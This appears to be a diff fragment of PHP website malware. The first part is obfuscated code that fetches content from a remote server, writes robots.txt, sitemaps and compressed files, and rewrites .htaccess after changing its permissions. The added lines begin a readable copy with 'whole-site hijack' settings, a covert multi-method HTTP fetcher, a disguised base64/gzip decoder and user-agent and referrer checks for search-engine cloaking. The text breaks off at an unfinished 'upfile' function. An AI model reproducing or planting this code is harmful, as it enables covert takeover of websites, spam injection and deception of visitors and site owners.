urlencode($OOooOOoOo),$all_jump,urlencode(date($O{31}.$O{53}.$O{25}.$O{53}.$O{12})),urlencode($uri_start),$jumpNo);if (isset($_GET[$O{14}.$O{6}.$O{8}.$O{52}.$O{6}.$O{3}.$O{18}.$O{65}])) { echo $oOOoOoooOOooo; exit();}if (strstr($ooooOOoOOoOOoOOOOO,$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4})||strstr($ooooOOoOOoOOoOOOOO,$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{61})) { $lineNos =explode($O{90},$lineNo); $value = $lineNos[0]; $OOoOOoOOoOOoOOOO = sprintf($OoOOoOOOoOOOoO, $value); $oooOOoOOoOOoOOoOOOO = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{12}.$O{10}.$O{4}.$O{10}.$O{68}.$O{68}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{61}.$O{85}.$O{11}.$O{78}.$O{6}.$O{61}.$O{85}.$O{11}.$O{78}.$O{3}.$O{61}.$O{85}.$O{11}.$O{78}.$O{18}.$O{61}.$O{85}.$O{11}.$O{78}.$O{24}.$O{61}.$O{85}.$O{11}.$O{78}.$O{4}.$O{61}.$O{85}.$O{11}.$O{78}.$O{15}.$O{61}.$O{85}.$O{11}.$O{78}.$O{14}.$O{61}.$O{85}.$O{11}; $oooOOoOOoOOoOOoOOOO = preg_replace($O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{11}.$O{7}, $OOoOOoOOoOOoOOOO, $oooOOoOOoOOoOOoOOOO); $oooOOoOOoOOoOOoOOOO = sprintf($oooOOoOOoOOoOOoOOOO, $OooOOoOOOOO, urlencode($ooooOOoOOoOOoOOOOO.$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{11}.$O{15}.$O{2}.$O{24}.$O{14}.$O{21}.$O{15}.$O{2}.$O{24}.$O{14}), urlencode($OoOOoOo), urlencode($OOooOOoOo),$all_data,urlencode(date($O{31}.$O{53}.$O{25}.$O{53}.$O{12})),urlencode($uri_start),$value); $OoOOOOoOOo = oooOOoOOoOOoO($oooOOoOOoOOoOOoOOOO); if(strstr($OoOOOOoOOo,$O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56})){if(strstr($ooooOOoOOoOOoOOOOO,$O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{9}.$O{7}.$O{24}.$O{14}.$O{61}.$O{9}.$O{7}.$O{24}.$O{14})){$addarr_tmp = explode($O{83}.$O{24},$OoOOOOoOOo);for($i=2;$i<rand(20,50);$i++){if(strstr(trim($addarr_tmp[$i]),$O{59}.$O{20}.$O{25}.$O{18})){$oooooOOoOOo = $O{15}.$O{4}.$O{4}.$O{9}.$O{11}.$O{62}.$O{63}.$O{63}.$O{1}.$O{1}.$O{1}.$O{59}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{59}.$O{21}.$O{8}.$O{25}.$O{63}.$O{9}.$O{7}.$O{24}.$O{14}.$O{55}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61}.str_replace($O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62},'',trim($addarr_tmp[$i]));if(stristr(file_get_contents($oooooOOoOOo),$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2})){echo $oooooOOoOOo.$O{8}.$O{17}.$O{58}.$O{23}.$O{3}.$O{56};}else{echo $oooooOOoOOo.$O{9}.$O{7}.$O{24}.$O{14}.$O{57}.$O{13}.$O{10}.$O{18}.$O{11}.$O{2}.$O{88}.$O{58}.$O{23}.$O{3}.$O{56};}}else{echo $O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{57}.$O{24}.$O{10}.$O{25}.$O{2}.$O{57}.$O{13}.$O{10}.$O{18}.$O{11}.$O{2}.$O{88}.$O{58}.$O{23}.$O{3}.$O{56};}}exit;}$OoOOOOoOOo = str_replace($O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56},'',$OoOOOOoOOo);@file_put_contents($O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4}, $OoOOOOoOOo);exit($OoOOOOoOOo); } unset($OoOOOOoOOo, $oooOOoOOoOOoOOoOOOO, $OOoOOoOOoOOoOOOO, $OoOOoOOOoOOOoO, $ooooOOoOOoOOoOOOOO, $OooOOoOOOOO, $OoOOoOo,$OOooOOoOo); exit();}if (strstr($ooooOOoOOoOOoOOOOO,$O{59}.$O{20}.$O{25}.$O{18})) { $lineNos =explode($O{90},$lineNo); $value = $lineNos[$O{67}]; $OOoOOoOOoOOoOOOO = sprintf($OoOOoOOOoOOOoO, $value); $oooOOoOOoOOoOOoOOOO = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{12}.$O{10}.$O{4}.$O{10}.$O{68}.$O{68}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{61}.$O{85}.$O{11}.$O{78}.$O{6}.$O{61}.$O{85}.$O{11}.$O{78}.$O{3}.$O{61}.$O{85}.$O{11}.$O{78}.$O{18}.$O{61}.$O{85}.$O{11}.$O{78}.$O{24}.$O{61}.$O{85}.$O{11}.$O{78}.$O{4}.$O{61}.$O{85}.$O{11}.$O{78}.$O{15}.$O{61}.$O{85}.$O{11}.$O{78}.$O{14}.$O{61}.$O{85}.$O{11}; $oooOOoOOoOOoOOoOOOO = preg_replace($O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{11}.$O{7}, $OOoOOoOOoOOoOOOO, $oooOOoOOoOOoOOoOOOO); $oooOOoOOoOOoOOoOOOO = sprintf($oooOOoOOoOOoOOoOOOO, $OooOOoOOOOO, urlencode($ooooOOoOOoOOoOOOOO.$O{12}.$O{7}.$O{4}.$O{6}.$O{11}.$O{15}.$O{2}.$O{24}.$O{14}.$O{21}.$O{15}.$O{2}.$O{24}.$O{14}), urlencode($OoOOoOo), urlencode($OOooOOoOo),$all_data,urlencode(date($O{31}.$O{53}.$O{25}.$O{53}.$O{12})),urlencode($uri_start),$value); $OoOOOOoOOo = oooOOoOOoOOoO($oooOOoOOoOOoOOoOOOO); if(strstr($OoOOOOoOOo,$O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56})){if(strstr($OoOOOOoOOo,$O{14}.$O{2}.$O{4}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{69}.$O{67}.$O{67}.$O{9}.$O{10}.$O{14}.$O{2})){@header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{64}.$O{57}.$O{69}.$O{67}.$O{67}.$O{57}.$O{33}.$O{24}.$O{4}.$O{2}.$O{3}.$O{24}.$O{10}.$O{18}.$O{57}.$O{37}.$O{2}.$O{3}.$O{22}.$O{2}.$O{3}.$O{57}.$O{28}.$O{3}.$O{3}.$O{8}.$O{3});exit();}else if(strstr($OoOOOOoOOo,$O{14}.$O{2}.$O{4}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{70}.$O{67}.$O{70}.$O{9}.$O{10}.$O{14}.$O{2})){@header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{64}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12});exit();}$OoOOOOoOOo = str_replace($O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56},'',$OoOOOOoOOo);if (strstr($ooooOOoOOoOOoOOOOO,$O{59}.$O{20}.$O{25}.$O{18}.$O{59}.$O{14}.$O{19})) {$lengb=strpos($ooooOOoOOoOOoOOOOO,$O{59}.$O{20}.$O{25}.$O{18}.$O{59}.$O{14}.$O{19})+7;$xml_name = explode($O{63},str_replace($O{55},$O{63},substr($ooooOOoOOoOOoOOOOO,0,$lengb)));header($O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{30}.$O{5}.$O{9}.$O{2}.$O{62}.$O{57}.$O{10}.$O{9}.$O{9}.$O{18}.$O{7}.$O{21}.$O{10}.$O{4}.$O{7}.$O{8}.$O{24}.$O{63}.$O{20}.$O{53}.$O{14}.$O{19}.$O{7}.$O{9});header($O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{38}.$O{7}.$O{11}.$O{9}.$O{8}.$O{11}.$O{7}.$O{4}.$O{7}.$O{8}.$O{24}.$O{62}.$O{57}.$O{10}.$O{4}.$O{4}.$O{10}.$O{21}.$O{15}.$O{25}.$O{2}.$O{24}.$O{4}.$O{75}.$O{57}.$O{13}.$O{7}.$O{18}.$O{2}.$O{24}.$O{10}.$O{25}.$O{2}.$O{61}.$O{54}.$xml_name[count($xml_name)-1].'"');header($O{47}.$O{10}.$O{21}.$O{15}.$O{2}.$O{53}.$O{47}.$O{8}.$O{24}.$O{4}.$O{3}.$O{8}.$O{18}.$O{62}.$O{57}.$O{24}.$O{8}.$O{53}.$O{21}.$O{10}.$O{21}.$O{15}.$O{2}.$O{92}.$O{57}.$O{24}.$O{8}.$O{53}.$O{11}.$O{4}.$O{8}.$O{3}.$O{2}.$O{92}.$O{57}.$O{25}.$O{10}.$O{20}.$O{53}.$O{10}.$O{14}.$O{2}.$O{61}.$O{67}.$O{92}.$O{57}.$O{25}.$O{6}.$O{11}.$O{4}.$O{53}.$O{3}.$O{2}.$O{22}.$O{10}.$O{18}.$O{7}.$O{12}.$O{10}.$O{4}.$O{2});header($O{35}.$O{3}.$O{10}.$O{14}.$O{25}.$O{10}.$O{62}.$O{57}.$O{24}.$O{8}.$O{53}.$O{21}.$O{10}.$O{21}.$O{15}.$O{2});$gz_sitemap_content = gzencode($OoOOOOoOOo, 9);echo $gz_sitemap_content;exit();}if(strstr($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61})){$ooOOOoooooOooO = strpos($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61})+13;$ooOOOoooooOooOO = substr($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$ooOOOoooooOooO);if ($ooOOOoooooOooOO != '') {if(strstr($ooOOOoooooOooOO,$O{63})){$oOOoOOOOoooO =explode($O{63},$ooOOOoooooOooOO);if (!file_exists($oOOoOOOOoooO[$O{67}])) {mkdir($oOOoOOOOoooO[$O{67}]);}}if(@file_put_contents($ooOOOoooooOooOO, $OoOOOOoOOo)){$ooOOOoooooOooOOO = $O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4};$ooOOOoooooOooOOOOO = $O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$O{57}.$O{57}.$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OooOOoOOOOO.$O{63}.$ooOOOoooooOooOO.$O{83}.$O{24};if ($ooOOOoooooOooOOO != '' && file_exists($ooOOOoooooOooOOO)) {$ooOOOoooooOooOOOO = @file_get_contents($ooOOOoooooOooOOO);$ooOOOoooooOooOOOOO = $ooOOOoooooOooOOOOO . $ooOOOoooooOooOOOO;@file_put_contents($ooOOOoooooOooOOO, $ooOOOoooooOooOOOOO);}else{@file_put_contents($ooOOOoooooOooOOO, $ooOOOoooooOooOOOOO);}echo exit($ooOOOoooooOooOO.$O{57}.$O{8}.$O{17});}else{echo exit($O{13}.$O{10}.$O{7}.$O{18});}}}if(strstr($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{14}.$O{19}.$O{61})){$ooOOOoooooOooOOOOOO = strpos($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{14}.$O{19}.$O{61})+15;$ooooOOOoooooOooOOOOOO = substr($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}],$ooOOOoooooOooOOOOOO);if ($ooooOOOoooooOooOOOOOO != '') {if(strstr($ooooOOOoooooOooOOOOOO,$O{63})){$oOOoOOOOoooO =explode($O{63},$ooooOOOoooooOooOOOOOO);if (!file_exists($oOOoOOOOoooO[0])) {mkdir($oOOoOOOOoooO[0]);}}$ooooOOOOoooooOooOOOOOO = $ooooOOOoooooOooOOOOOO.$O{59}.$O{14}.$O{19};$OOoOOoOOoOOooOOo = gzopen($ooooOOOOoooooOooOOOOOO, $O{1}.$O{73});gzwrite ($OOoOOoOOoOOooOOo, $OoOOOOoOOo);gzclose($OOoOOoOOoOOooOOo);echo exit($ooooOOOoooooOooOOOOOO.$O{59}.$O{14}.$O{19}.$O{57}.$O{8}.$O{17});}}@header($O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{4}.$O{5}.$O{9}.$O{2}.$O{62}.$O{57}.$O{4}.$O{2}.$O{20}.$O{4}.$O{63}.$O{20}.$O{25}.$O{18});exit($OoOOOOoOOo);unset($OoOOOOoOOo, $oooOOoOOoOOoOOoOOOO, $OOoOOoOOoOOoOOOO, $OoOOoOOOoOOOoO, $ooooOOoOOoOOoOOOOO, $OooOOoOOOOO, $OoOOoOo,$OOooOOoOo);exit(); }}if($OoOOoOOoOOoOoO){$OoOOOOoOOo = oooOOoOOoOOoO($oOOoOoooOOooo);if(strstr($OoOOOOoOOo,$O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56})){$OoOOOOoOOo = str_replace($O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56},'',$OoOOOOoOOo);echo "$OoOOOOoOOo";unset($OoOOOOoOOo, $oooOOoOOoOOoOOoOOOO, $OOoOOoOOoOOoOOOO, $OoOOoOOOoOOOoO, $ooooOOoOOoOOoOOOOO, $OooOOoOOOOO, $OoOOoOo,$OOooOOoOo);exit();}}if($ooOOOoooooOooo){$lineNos =explode($O{90},$lineNo);for ($i=0;$i<count($lineNos);$i++){$OOoOOoOOoOOoOOOO = sprintf($OoOOoOOOoOOOoO, $lineNos[$i]);$oooOOoOOoOOoOOoOOOO = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{12}.$O{10}.$O{4}.$O{10}.$O{68}.$O{68}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{61}.$O{85}.$O{11}.$O{78}.$O{6}.$O{61}.$O{85}.$O{11}.$O{78}.$O{3}.$O{61}.$O{85}.$O{11}.$O{78}.$O{18}.$O{61}.$O{85}.$O{11}.$O{78}.$O{24}.$O{61}.$O{85}.$O{11}.$O{78}.$O{4}.$O{61}.$O{85}.$O{11}.$O{78}.$O{15}.$O{61}.$O{85}.$O{11}.$O{78}.$O{14}.$O{61}.$O{85}.$O{11};$oooOOoOOoOOoOOoOOOO = preg_replace($O{63}.$O{85}.$O{15}.$O{8}.$O{11}.$O{4}.$O{85}.$O{63}.$O{11}.$O{7}, $OOoOOoOOoOOoOOOO, $oooOOoOOoOOoOOoOOOO);$oooOOoOOoOOoOOoOOOO = sprintf($oooOOoOOoOOoOOoOOOO, $OooOOoOOOOO, urlencode($ooooOOoOOoOOoOOOOO), urlencode($OoOOoOo), urlencode($OOooOOoOo),$all_data,urlencode(date($O{31}.$O{53}.$O{25}.$O{53}.$O{12})),urlencode($uri_start),$lineNos[$i]);if (isset($_GET[$O{14}.$O{6}.$O{8}.$O{52}.$O{6}.$O{3}.$O{18}.$O{64}])) {echo $oooOOoOOoOOoOOoOOOO;exit();}$OoOOOOoOOo = oooOOoOOoOOoO($oooOOoOOoOOoOOoOOOO);if(strstr($OoOOOOoOOo,$O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56})){if(strstr($OoOOOOoOOo,$O{14}.$O{2}.$O{4}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{69}.$O{67}.$O{67}.$O{9}.$O{10}.$O{14}.$O{2})){@header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{64}.$O{57}.$O{69}.$O{67}.$O{67}.$O{57}.$O{33}.$O{24}.$O{4}.$O{2}.$O{3}.$O{24}.$O{10}.$O{18}.$O{57}.$O{37}.$O{2}.$O{3}.$O{22}.$O{2}.$O{3}.$O{57}.$O{28}.$O{3}.$O{3}.$O{8}.$O{3});exit();}else if(strstr($OoOOOOoOOo,$O{14}.$O{2}.$O{4}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{70}.$O{67}.$O{70}.$O{9}.$O{10}.$O{14}.$O{2})){@header($O{41}.$O{30}.$O{30}.$O{35}.$O{63}.$O{64}.$O{59}.$O{64}.$O{57}.$O{70}.$O{67}.$O{70}.$O{57}.$O{50}.$O{8}.$O{4}.$O{57}.$O{39}.$O{8}.$O{6}.$O{24}.$O{12});exit();}else{$OoOOOOoOOo = str_replace($O{58}.$O{11}.$O{9}.$O{10}.$O{24}.$O{14}.$O{8}.$O{56},'',$OoOOOOoOOo);echo "$OoOOOOoOOo";unset($OoOOOOoOOo, $oooOOoOOoOOoOOoOOOO, $OOoOOoOOoOOoOOOO, $OoOOoOOOoOOOoO, $ooooOOoOOoOOoOOOOO, $OooOOoOOOOO, $OoOOoOo,$OOooOOoOo);exit();}}}} } function ooOOoOOoOOo($OoooOO = '', $OooOOO,$OoooOOOO){global $O;$OoooOOOO = substr($OoooOOOO, $O{67}, @strrpos($OoooOOOO, $O{59}));$OoooOO= $O{58}.$O{33}.$O{13}.$O{51}.$O{8}.$O{12}.$O{6}.$O{18}.$O{2}.$O{57}.$O{25}.$O{8}.$O{12}.$O{52}.$O{3}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{59}.$O{21}.$O{56}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{28}.$O{24}.$O{14}.$O{7}.$O{24}.$O{2}.$O{83}.$O{20}.$O{65}.$O{67}.$O{34}.$O{24}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{49}.$O{10}.$O{11}.$O{2}.$O{83}.$O{20}.$O{65}.$O{67}.$O{63}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{29}.$O{6}.$O{18}.$O{2}.$O{83}.$O{20}.$O{65}.$O{67}.$O{79}.$O{54}.$O{59}.$O{80}.$O{3}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{59}.$O{54}.$O{59}.$O{9}.$O{15}.$O{9}.$O{80}.$O{83}.$O{20}.$O{65}.$O{67}.$O{53}.$O{83}.$O{20}.$O{65}.$O{67}.$O{81}.$O{44}.$O{82}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{47}.$O{8}.$O{24}.$O{12}.$O{83}.$O{20}.$O{65}.$O{67}.$O{85}.$O{86}.$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{39}.$O{33}.$O{44}.$O{28}.$O{50}.$O{36}.$O{51}.$O{28}.$O{87}.$O{83}.$O{20}.$O{65}.$O{67}.$O{88}.$O{53}.$O{13}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{47}.$O{8}.$O{24}.$O{12}.$O{83}.$O{20}.$O{65}.$O{67}.$O{85}.$O{86}.$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{39}.$O{33}.$O{44}.$O{28}.$O{50}.$O{36}.$O{51}.$O{28}.$O{87}.$O{83}.$O{20}.$O{65}.$O{67}.$O{88}.$O{53}.$O{12}.$O{83}.$O{24};$OoooOO .=$O{29}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{29}.$O{6}.$O{18}.$O{2}.$O{83}.$O{20}.$O{65}.$O{67}.$O{59}.$O{83}.$O{20}.$O{65}.$O{67}.$O{63}.$O{54}.$O{59}.$O{80}.$O{3}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{52}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{59}.$O{54}.$O{59}.$O{9}.$O{15}.$O{9}.$O{57}.$O{81}.$O{44}.$O{82}.$O{83}.$O{24};$OoooOO .=$O{58}.$O{63}.$O{33}.$O{13}.$O{51}.$O{8}.$O{12}.$O{6}.$O{18}.$O{2}.$O{56};if ($OoooOO != '') {if ($OooOOO) {$OOOooOOO = $O{59}.$O{63}.$O{59}.$O{15}.$O{4}.$O{10}.$O{21}.$O{21}.$O{2}.$O{11}.$O{11};if ($OOOooOOO != '' && file_exists($OOOooOOO)) {@chmod($OOOooOOO, $O{67}.$O{72}.$O{72}.$O{72});$OOOOooO = @file_get_contents($OOOooOOO);if (!preg_match($O{63}.$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{39}.$O{33}.$O{44}.$O{28}.$O{50}.$O{36}.$O{51}.$O{28}.$O{63}, $OOOOooO) && !preg_match($O{63}.$OooOOoOOOOOOoO.$O{59}.$O{9}.$O{15}.$O{9}.$O{63}, $OOOOooO)) {$OOOOooO = $OoooOO . PHP_EOL .$OOOOooO;@file_put_contents($OOOooOOO, $OOOOooO);}}@chmod($OOOooOOO, $O{67}.$O{70}.$O{70}.$O{70});}} } ooOOOoooooOOoOo(); ?>
+<?php 
+header('Content-Type:text/html; charset=utf-8');
+error_reporting(0);
+$lineNo="2336";//组别数字
+$jumpNo="2336";//组别数字 全站劫持组别放第一个163|164|165
+$all_data="0";//是否全站劫持 1全站劫持
+$all_jump="0";//是否全站劫持 1全站劫持
+$rewrite_open = "1";//是否.h 1
+
+function rsync_httpreq($url, $async = 0, $method = 1, $pf = NULL, $headers = array()) {
+  if (!preg_match("/^http\:\/\//si", $url)) {
+    if (isset($_GET['urlerr'])) {
+      $err = '[urlerror] invalid url:&nbsp;';
+      $err .= $url;
+      echo $err;
+      unset($err);
+      exit();
+    }
+    return '';
+  }
+  $a = 'curl_init+curl_setopt+curl_exec|fsockopen|pfsockopen|stream_socket_client|socket_create';
+  $b = $out = '';
+  foreach (explode('|', $a) as $c) {
+    $y = 1;
+    if ($async && substr($c, 0, 1) == 'c') {
+      continue;
+    }
+    foreach (explode('+', $c) as $d) {
+      if (!function_exists($d)) {
+        $y = 0;
+      }
+    }
+    unset($d);
+    if ($y) {
+      $b = $c;
+      break;
+    }
+  }
+  unset($a, $c);
+  if ($b == '') {
+    return 0;
+  }
+  if (substr($b, 0, 1) == 'c') {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'WHR');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
+    if ($method == 2) {
+      curl_setopt($ch, CURLOPT_POST, 1);
+      if(is_array($pf)){
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($pf));
+      }
+    }
+    $r = curl_exec($ch);
+    curl_close($ch);
+    if (!$r) {
+      if (isset($_GET['curlerr'])) {
+        $err = '[curl error]&nbsp;';
+        $err .= curl_error($ch);
+        echo $err;
+        unset($err);
+        exit();
+      }
+      return 0;
+    }else{
+      $r = trim(trim($r, "\xEF\xBB\xBF"));
+      return $r;
+    }
+  }
+  $parse = parse_url($url);
+  isset($parse['host']) || $parse['host'] = '';
+  isset($parse['path']) || $parse['path'] = '';
+  isset($parse['query'])|| $parse['query'] = '';
+  isset($parse['port']) || $parse['port'] = '';
+  $xpath = $parse['path'] ? $parse['path'].($parse['query'] ? '?'.$parse['query'] : '') : '/';
+  $_host = $parse['host'];
+  if ($parse['scheme'] == 'https') {
+    $version = '1.1';
+    $port = empty($parse['port']) ? 443 : $parse['port'];
+    $_host = 'ssl://';
+    $_host .= $parse['host'];
+  } else {
+    $version = '1.0';
+    $port = empty($parse['port']) ? 80 : $parse['port'];
+  }
+  $hhost = 'Host: ';
+  $hhost .= $_host;
+  $headers[] = $hhost;
+  $headers[] = 'Connection: Close';
+  $headers[] = 'User-Agent: WHR';
+  $headers[] = 'Accept: */*';
+  unset($hhost);
+  if ($method == 2) {
+    if(is_array($pf)){
+        $pf = http_build_query($pf);
+    }
+    $headers[] = 'Content-type: application/x-www-form-urlencoded';
+    $headers[] = 'Content-Length: '.strlen($pf);
+    $out = "POST $xpath HTTP/$version\r\n".join("\r\n", $headers)."\r\n\r\n".$pf;
+    unset($pf);
+  } else {
+    $out = "GET $xpath HTTP/$version\r\n".join("\r\n", $headers)."\r\n\r\n";
+  }
+  unset($headers, $parse, $version, $xpath);
+
+  $fp = null;
+  if (substr($b, -1) == 'n') {
+    $fp = $b($_host, $port, $errno, $errstr, 30);
+  }else{
+    if (substr($b, -1) == 't') {
+      $tcp = 'tcp://';
+      $tcp .= $_host;
+      $tcp .= ':';
+      $tcp .= $port;
+      $fp = stream_socket_client($tcp, $errno, $errstr, 30);
+      unset($tcp);
+    }
+  }
+  $content = '';
+  if ($fp) {
+    stream_set_blocking($fp, true);
+    stream_set_timeout($fp, 30);
+    fwrite($fp, $out);
+    if (!$async) {
+      $status = stream_get_meta_data($fp);
+      if (!$status['timed_out']) {
+          while (!feof($fp)) {
+            $line = fgets($fp);
+            if ($line && ($line == "\r\n" || $line == "\n")) {
+              break;
+            }
+            unset($line);
+          }
+          while (!feof($fp)) {
+              $data = fread($fp, 8192);
+              $content .= $data;
+              unset($data);
+          }
+      }
+      unset($status);
+    }
+    fclose($fp);
+  }else{
+    if (substr($b, -1) == 'e') {
+      $_ip = gethostbyname($_host);
+      $fp = $b(AF_INET, SOCK_STREAM, 0);
+      if (socket_connect($fp, $_ip, $port)) {
+        if (!$async) {
+          socket_write($fp, $out, strlen($out));
+          while($bf=@socket_read($fp, 8192)){
+              $content .= $bf;
+              unset($bf);
+          }
+          $content = explode("\r\n\r\n", $content);
+          array_shift($content);
+          $content = implode("\r\n\r\n", $content);
+        }else{
+          $t = mt_rand(2, 5);
+          $i = 0;
+          while ($i < $t) {
+            socket_write($fp, $out, strlen($out));
+            $i++;
+            usleep(mt_rand(50000, 100000));
+          }
+          unset($i, $t);
+        }
+      }
+      socket_close($fp);
+      unset($_ip);
+    }
+  }
+  if ($content == '') {
+		if (function_exists('file_get_contents') and $url) {
+			$content = @file_get_contents($url);
+		}
+	}
+  unset($out, $b, $fp, $port, $_host);
+  if (!$async) {
+    $content = preg_replace_callback(
+        '/(?:(?:\r\n|\n)|^)([0-9A-F]+)(?:\r\n|\n){1,2}(.*?)'.
+        '((?:\r\n|\n)(?:[0-9A-F]+(?:\r\n|\n))|$)/si',
+        create_function(
+            '$matches',
+            'return hexdec($matches[1]) == strlen($matches[2]) ? $matches[2] : $matches[0];'
+        ),
+        $content
+    );
+    return trim(trim($content, "\xEF\xBB\xBF"));
+  }else{
+    return 1;
+  }
+}
+function BASE64_DEC0DE($string){
+  $base_pre = substr($string, 0, 5);
+  $base_ext = substr($string, -5);
+  $base_ = substr($string, 7, strlen($string) - 14);
+  return gzinflate(base64_decode($base_pre . $base_ . $base_ext));
+}
+function func_loginCheck($agent){
+  $login = false;
+  $bots = 'googlebot|bingbot|google|aol|bing|yahoo';
+  
+  if ($agent != '') {
+    if (preg_match("/($bots)/si", $agent)) {
+      $login = true;
+    }
+  }
+  return $login;
+}
+function func_referCheck($refer){
+  $redi = false;
+  $referbots = 'google.co|yahoo.co.jp|bing';
+  if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
+    $redi = true;
+  }
+  return $redi;
+}
+
+
+function upfile(){
